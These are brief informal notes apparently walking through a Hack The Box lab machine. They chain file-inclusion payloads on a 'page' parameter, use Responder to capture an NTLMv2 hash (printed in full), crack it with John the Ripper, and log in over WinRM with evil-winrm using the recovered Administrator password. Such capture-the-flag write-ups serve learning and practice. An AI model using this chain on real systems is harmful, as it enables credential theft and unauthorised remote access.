scanning this box

we found it had 2 http servers open

when connecting to port 80 it redirected us to `unika.htb`
but this didnt load so we added this dns record to the ip of the vm
and the site loaded

on this site there are multiple "languages" through the page parameter

bcs of this we can try "local file inclusion", "remote file inclusion" payloads like:
- "//10.10.14.6/somefile"
- "../../../../../../../../windows/system32/drivers/etc/hosts"
- "minikatz.exe"


opening responder on our machine,

and going to "http://unika.htb/index.php?page=//{ourmachine}/somefile"

we get a ntlm hash

[SMB] NTLMv2-SSP Client   : 10.129.127.122
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3a22b56788eee093:3037F05328B1B6CCCE5C14D183414506:01010000000000000034F98290B0DA01245CBC9072297CB9000000000200080057004E0045004F0001001E00570049004E002D00350042005A004C00440057005A005A00380039004F0004003400570049004E002D00350042005A004C00440057005A005A00380039004F002E0057004E0045004F002E004C004F00430041004C000300140057004E0045004F002E004C004F00430041004C000500140057004E0045004F002E004C004F00430041004C00070008000034F98290B0DA0106000400020000000800300030000000000000000100000000200000101791CED80EBD9755894B811652C2BB5C75AFDC54111186421B6BE73B18FFA80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00350031000000000000000000

cracking it with john the ripper:
john --wordlist=rockyou.txt hashes.txt

we get the password


then using evil-winrm -u Administrator -p badminton -i {boxip}

we can login through winrm and get the flag in mikes desktop directory